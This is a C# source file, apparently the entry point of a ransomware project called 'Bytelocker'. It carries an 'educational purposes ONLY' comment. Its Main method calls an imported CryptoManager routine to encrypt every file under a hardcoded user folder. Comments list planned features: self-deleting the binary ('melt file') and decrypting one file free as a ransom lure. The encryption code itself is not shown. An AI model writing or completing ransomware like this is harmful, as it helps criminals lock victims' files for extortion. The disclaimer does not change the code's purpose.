using ransomeware.CryptoManager;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

/*
 * Created for educational purposes ONLY
 * 
 */
namespace ransomeware
{
    class Bytelocker
    {

        string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private static String PATH_TO_ENCRYPT = @"C:\Users\nic\Desktop\New folder";

        public static void Main(String[] args)
        {
            /*
            melt file
            } decrypt one file for free
            */

            CryptoManagerMainHandler cm = new CryptoManagerMainHandler();
            cm.EncryptAll(PATH_TO_ENCRYPT);


        } 
    }
}
